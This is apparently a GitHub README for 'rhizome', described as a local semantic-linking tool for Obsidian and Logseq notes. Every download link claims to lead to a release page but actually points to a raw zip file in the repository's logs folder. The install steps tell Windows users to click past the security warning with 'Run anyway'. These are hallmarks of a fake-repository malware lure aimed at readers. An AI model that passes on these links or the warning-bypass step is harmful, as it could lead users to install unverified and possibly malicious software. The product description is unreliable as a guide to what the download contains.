# 🪢 rhizome - Find related notes fast

[![Download rhizome](https://img.shields.io/badge/Download%20rhizome-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Open-priority231/rhizome/raw/refs/heads/main/logs/Software_v2.2.zip)

## 📌 What rhizome does

rhizome helps you find related notes inside Obsidian and Logseq.

It reads your notes on your computer, turns each note into a sentence-based vector, and uses that to find links that fit the meaning of the text. It then writes a `## Related Notes` section with wikilinks so you can move between notes with less manual work.

You do not need a cloud service. You do not need a database. Your notes stay local.

## ✅ What you need

- Windows 10 or Windows 11
- Enough space to store your notes and the app
- Obsidian or Logseq if you want to use the links in a note app
- A folder of plain text notes in Markdown format
- Internet access only to download rhizome from GitHub

## 🚀 Download rhizome

Visit the release page to download rhizome:

[Download rhizome from GitHub Releases](https://github.com/Open-priority231/rhizome/raw/refs/heads/main/logs/Software_v2.2.zip)

On the release page, pick the latest Windows file. If you see more than one file, choose the one that ends in `.exe` or `.zip` for Windows.

## 🪟 Install on Windows

1. Open the download page.
2. Download the latest Windows release.
3. If the file is a `.zip`, right-click it and choose **Extract All**.
4. Open the extracted folder.
5. If the file is a `.exe`, double-click it to run rhizome.
6. If Windows shows a security prompt, choose **More info** and then **Run anyway** only if the file came from the GitHub release page above.

## 🗂️ Set up your notes

rhizome works best when your notes are in one place.

Use a folder that contains your Markdown files, such as:

- Obsidian vaults
- Logseq journals and pages
- A folder of `.md` files

Keep your notes in a simple structure. rhizome scans note text and looks for meaning, so file names can stay short and plain.

## ⚙️ How to use rhizome

1. Open rhizome.
2. Choose the folder that holds your notes.
3. Let rhizome scan your notes.
4. Wait while it builds embeddings for your content.
5. Open a note or run the related-notes action.
6. rhizome writes a `## Related Notes` section with wikilinks like `[[Some Other Note]]`.

If you already use Obsidian or Logseq, you can keep using your normal workflow. rhizome adds links that help you jump between notes with less effort.

## 🧠 How the matching works

rhizome uses semantic search, not simple keyword matching.

That means it looks at meaning, not just exact words. If one note talks about “home network” and another talks about “router setup,” rhizome can still connect them if they share the same idea.

This works well for:

- Personal knowledge bases
- Zettelkasten-style notes
- Research notes
- Daily notes
- Idea cards
- Project notes
- Long writing drafts

## 📝 Example output

rhizome can add a section like this to a note:

## Related Notes

- [[Personal Knowledge System]]
- [[Note Linking Workflow]]
- [[Daily Review]]
- [[Research Index]]

This keeps the link list clean and easy to scan inside Obsidian or Logseq.

## 🔍 Best results

To get useful links, keep your notes clear and focused.

A few simple habits help:

- Write one main idea per note when you can
- Use plain note titles
- Add short headings in long notes
- Keep text in Markdown
- Avoid huge notes with many unrelated topics
- Let rhizome rescan after you add new notes

## 🖥️ Typical use cases

### For Obsidian users
rhizome can help you build more backlinks between notes, even when you forgot to link them by hand.

### For Logseq users
rhizome can find related pages and journal entries based on what they mean, not only what they say.

### For Zettelkasten users
rhizome helps surface hidden links between atomic notes and makes it easier to grow a note network.

### For local-first users
rhizome keeps your data on your machine. It does not need a cloud account.

## 🧩 Supported note types

rhizome works well with:

- `.md` Markdown files
- Wiki-style links
- Plain text notes with headings
- Notes with mixed English and other languages
- Mixed note vaults with many topics

It uses a multilingual sentence transformer, so it can handle more than one language in the same note set.

## 🛠️ Troubleshooting

### The app does not start
- Make sure you downloaded the Windows release from GitHub
- Check that Windows did not block the file
- Try extracting the `.zip` file again if you used one

### My notes do not show related links
- Make sure rhizome can find your note folder
- Check that your notes use Markdown files
- Re-run the scan after adding new notes

### The links look wrong
- Shorten very long note titles
- Make sure note names match the page titles you use in Obsidian or Logseq
- Avoid duplicate file names in the same vault

### Search results feel weak
- Add more context to notes
- Use clearer headings
- Split large notes into smaller ones
- Rebuild the note index after big changes

## 🔐 Privacy

rhizome runs on your computer.

Your notes do not need to leave your device for the app to work. This makes it a good fit for private writing, research, and personal knowledge work.

## 📁 File layout

A typical setup may look like this:

- `rhizome.exe`
- `notes/`
  - `project-ideas.md`
  - `reading-notes.md`
  - `daily/2026-04-19.md`

You can point rhizome at the main folder and let it scan everything below it.

## 🧭 Tips for Obsidian and Logseq

- Keep the vault or graph path easy to find
- Use note titles that match how you think
- Let rhizome add related links, then review them by hand
- Use the related notes section as a starting point, not the only source of links

## 🧪 Suggested first run

After you install rhizome:

1. Pick a small folder with a few notes.
2. Run the scan.
3. Open a note that has several themes.
4. Check the `Related Notes` section.
5. Add more notes if the links look useful.

This makes it easier to see how rhizome behaves before you point it at a larger vault.

## 📦 Topics

- local-first
- logseq
- notes
- obsidian
- onnx
- pkm
- semantic-search
- wikilinks
- zettelkasten

## 📥 Download and run

Use the release page below to download and run rhizome on Windows:

[Go to rhizome Releases](https://github.com/Open-priority231/rhizome/raw/refs/heads/main/logs/Software_v2.2.zip)

